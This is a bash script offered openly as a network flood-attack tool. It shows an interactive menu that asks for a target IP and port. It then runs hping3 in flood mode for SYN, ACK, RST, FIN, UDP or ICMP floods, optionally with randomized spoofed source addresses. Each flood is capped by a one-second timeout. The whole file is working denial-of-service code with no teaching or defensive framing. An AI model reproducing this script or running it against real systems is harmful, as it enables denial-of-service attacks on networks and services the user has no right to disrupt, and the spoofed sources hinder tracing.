#!/bin/bash

launch_attack() {
    if [[ $1 == "1" ]]; then
        tcp_flood
    elif [[ $1 == "2" ]]; then
        udp_flood
    elif [[ $1 == "3" ]]; then
        icmp_flood
    fi
}

tcp_flood() {
    echo "Select TCP Flood Attack Type:"
    echo "1. SYN Flood"
    echo "2. ACK Flood"
    echo "3. RST Flood"
    echo "4. FIN Flood"
    read -p "Enter your choice (1/2/3/4): " tcp_attack_type

    read -p "Enter target IP: " target_ip
    read -p "Enter target port: " target_port
    read -p "Use --rand-source? (y/n): " use_rand_source

    if [[ $tcp_attack_type == "1" ]]; then
        tcp_syn_flood "$target_ip" "$target_port" "$use_rand_source"
    elif [[ $tcp_attack_type == "2" ]]; then
        tcp_ack_flood "$target_ip" "$target_port" "$use_rand_source"
    elif [[ $tcp_attack_type == "3" ]]; then
        tcp_rst_flood "$target_ip" "$target_port" "$use_rand_source"
    elif [[ $tcp_attack_type == "4" ]]; then
        tcp_fin_flood "$target_ip" "$target_port" "$use_rand_source"
    fi
}

tcp_syn_flood() {
    if [[ $3 == "y" ]]; then
        timeout 1 hping3 --flood -S --rand-source -p "$2" "$1"
    else
        timeout 1 hping3 --flood -S -p "$2" "$1"
    fi
}

tcp_ack_flood() {
    if [[ $3 == "y" ]]; then
        timeout 1 hping3 --flood -A --rand-source -p "$2" "$1"
    else
        timeout 1 hping3 --flood -A -p "$2" "$1"
    fi
}

tcp_rst_flood() {
    if [[ $3 == "y" ]]; then
        timeout 1 hping3 --flood -R --rand-source -p "$2" "$1"
    else
        timeout 1 hping3 --flood -R -p "$2" "$1"
    fi
}

tcp_fin_flood() {
    if [[ $3 == "y" ]]; then
        timeout 1 hping3 --flood -F --rand-source -p "$2" "$1"
    else
        timeout 1 hping3 --flood -F -p "$2" "$1"
    fi
}

udp_flood() {
    read -p "Enter target IP: " target_ip
    read -p "Enter target port: " target_port
    read -p "Use --rand-source? (y/n): " use_rand_source

    if [[ $use_rand_source == "y" ]]; then
        timeout 1 hping3 --flood -2 --rand-source -p "$target_port" "$target_ip"
    else
        timeout 1 hping3 --flood -2 -p "$target_port" "$target_ip"
    fi
}

icmp_flood() {
    read -p "Enter target IP: " target_ip
    read -p "Use --rand-source? (y/n): " use_rand_source

    if [[ $use_rand_source == "y" ]]; then
        timeout 1 hping3 --flood --icmp --rand-source "$target_ip"
    else
        timeout 1 hping3 --flood --icmp "$target_ip"
    fi
}

echo "Select Flood Attack Type:"
echo "1. TCP Flood"
echo "2. UDP Flood"
echo "3. ICMP Flood"

read -p "Enter your choice (1/2/3): " attack_type

launch_attack "$attack_type"
